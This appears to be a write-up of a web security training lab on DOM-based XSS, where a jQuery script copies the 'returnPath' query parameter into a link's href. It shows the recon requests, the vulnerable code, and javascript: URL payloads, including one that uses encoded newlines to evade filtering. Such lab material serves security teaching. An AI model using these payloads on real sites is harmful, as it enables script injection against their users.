### Lab: DOM XSS in jQuery anchor href attribute sink using location.search source

#### Recon
---
**Request:**
```http
GET /feedback?returnPath=test HTTP/2
Host: 063.web-security-academy.net

...Omitted for Brevety...
```
**Response:**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 7294

...Omitted for Brevety...
```
`Inspecting the web page content`
```html
...Omitted for Brevety...

<a id="backLink" href="test">Back</a>

<script>
	$(function() {
		$('#backLink').attr("href",
		(new URLSearchParams(window.location.search)).get('returnPath'));
	});
</script>

...Omitted for Brevety...
```

**Affected Locations**
```
https://063.web-security-academy.net/feedback?returnPath=
```

```js
(new URLSearchParams(window.location.search)).get('returnPath'));
```
### Exploitation
----
**Payloads**
```
java%0a%0dscript:alert('XSS');
javascript:alert('XSS');
```
**Request:**
```http
GET /feedback?returnPath=java%0a%0dscript:alert(0); HTTP/2
Host: 063.web-security-academy.net

...Omitted for Brevety...
```
**Response:**
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 7294

...Omitted for Brevety...
```